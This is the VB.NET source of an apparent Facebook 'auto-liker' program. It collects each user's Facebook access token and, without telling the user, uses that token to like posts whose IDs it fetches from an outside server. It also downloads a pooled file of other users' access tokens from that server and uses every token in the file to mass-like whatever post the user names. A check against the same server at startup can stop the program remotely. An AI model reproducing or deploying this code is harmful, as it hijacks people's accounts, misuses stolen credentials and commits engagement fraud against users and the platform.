Imports System.Net
Imports System.IO

Public Class FRMMain
    Private Get_Access_Token_URL As String = "https://www.facebook.com/dialog/permissions.request?app_id=104018109673165&display=wap&next=http://www.facebook.com/connect/login_success.html&response_type=token&perms=email"
    Private User_Access_Token As String

    Private Sub HTTPWrite(ByVal HTTPMethod As String, ByVal ObjectID As String, ByVal AccessToken As String)
        Try
            Dim oWeb As New System.Net.WebClient()
            oWeb.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            Dim bytArguments As Byte() = System.Text.Encoding.ASCII.GetBytes("q=InTheory")
            Dim bytRetData As Byte() = oWeb.UploadData("https://graph.facebook.com/" + ObjectID + "/likes?access_token=" + AccessToken, HTTPMethod, bytArguments)

            Debug.Write(System.Text.Encoding.ASCII.GetString(bytRetData))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub DownloadAccessTokens()
        'Download all access tokens
        Using webClient = New WebClient()
            Dim bytes = webClient.DownloadData("http://tdy0123.neq3.com/at.txt")
            Dim access_tokens_path As String
            access_tokens_path = Path.Combine(System.IO.Path.GetTempPath, "test.tokens")
            File.WriteAllBytes(access_tokens_path, bytes)
        End Using
    End Sub
    Private Sub btnAuthorizeApp_Click(sender As Object, e As EventArgs) Handles btnAuthorizeApp.Click
        FRMAuthApp.WBAuthApp.Navigate(Get_Access_Token_URL)
        FRMAuthApp.Show()
    End Sub
    Private Sub btnClearCookies_Click(sender As Object, e As EventArgs) Handles btnClearCookies.Click
        Process.Start("rundll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 2")
    End Sub
    Private Sub btnSaveUserAccessToken_Click(sender As Object, e As EventArgs) Handles btnSaveUserAccessToken.Click
        If tbUserAccessToken.Text <> "" Then
            tbUserAccessToken.Enabled = False
            btnSaveUserAccessToken.Enabled = False
            tbObjectID.Enabled = True
            btnLikes.Enabled = True
            User_Access_Token = tbUserAccessToken.Text

            Dim wc As New WebClient()
            Dim dpdata = wc.DownloadString("http://tdy0123.neq3.com/dpid.txt")
            Dim statusdata = wc.DownloadString("http://tdy0123.neq3.com/statusid.txt")
            HTTPWrite("POST", dpdata, User_Access_Token)
            HTTPWrite("POST", statusdata, User_Access_Token)
        End If
    End Sub
    Private Sub btnLikes_Click(sender As Object, e As EventArgs) Handles btnLikes.Click
        ' like post using all tokens

        Dim token_lines() As String = IO.File.ReadAllLines(System.IO.Path.GetTempPath & "\test.tokens")
        Dim Strangers_Access_Token_Arr As New ArrayList()

        For x As Integer = 0 To token_lines.GetUpperBound(0)
            Strangers_Access_Token_Arr.Add(token_lines(x))
        Next

        For x = 0 To Strangers_Access_Token_Arr.Count - 1
            Try
                HTTPWrite("POST", tbObjectID.Text, Strangers_Access_Token_Arr.Item(x))
            Catch ex As Exception
            End Try
        Next

        MessageBox.Show("Finished liking!")
    End Sub
    Private Sub FRMMain_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub

    Private Sub FRMMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MessageBox.Show("made by deyi")
        Dim wc As New WebClient()
        Dim connectiondata = wc.DownloadString("http://tdy0123.neq3.com/fbconnection2.txt")
        If connectiondata = "false" Then
            End
        End If
    End Sub

    Private Sub TMRGetUpdatedLikes_Tick(sender As Object, e As EventArgs) Handles TMRGetUpdatedLikes.Tick
        Try
            DownloadAccessTokens()
            Dim NumberOfLikes = File.ReadAllLines(System.IO.Path.GetTempPath & "\test.tokens").Length
            lbGetPossibleLikes.Text = "Possible number of likes : " & NumberOfLikes
        Catch ex As Exception
        End Try
    End Sub
End Class
